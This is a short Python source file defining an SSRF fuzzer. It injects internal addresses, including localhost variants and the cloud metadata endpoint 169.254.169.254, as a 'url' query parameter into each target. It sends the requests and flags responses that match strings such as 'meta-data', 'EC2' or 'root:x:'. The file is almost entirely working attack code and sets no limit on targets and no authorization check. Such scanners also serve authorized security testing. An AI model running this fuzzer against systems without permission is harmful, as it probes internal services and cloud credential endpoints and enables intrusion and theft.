import requests

class SSRFFuzzer:
    def __init__(self):
        self.name = "Server-Side Request Forgery Fuzzer"
        self.payloads = [
            "http://localhost:80/",
            "http://127.0.0.1:80/",
            "http://169.254.169.254/latest/meta-data/",
            "http://internal.company.local/",
            "http://0.0.0.0:80/",
            "http://[::1]/"
        ]
        self.signatures = [
            "meta-data", "EC2", "root:x:", "admin", "127.0.0.1", "Unauthorized", "Forbidden"
        ]

    def run_tests(self, targets):
        results = {}
        for target in targets:
            for payload in self.payloads:
                test_url = f"{target}?url={payload}"
                status, response_text = self.send_request(test_url)
                is_vulnerable = self.analyze_response(response_text)
                results[test_url] = {
                    "status": status,
                    "vulnerable": is_vulnerable
                }
        return results

    def send_request(self, url):
        try:
            response = requests.get(url, timeout=6)
            return response.status_code, response.text[:1000]
        except requests.exceptions.RequestException:
            return "ERROR", "No response"

    def analyze_response(self, text):
        for sig in self.signatures:
            if sig.lower() in text.lower():
                return True
        return False
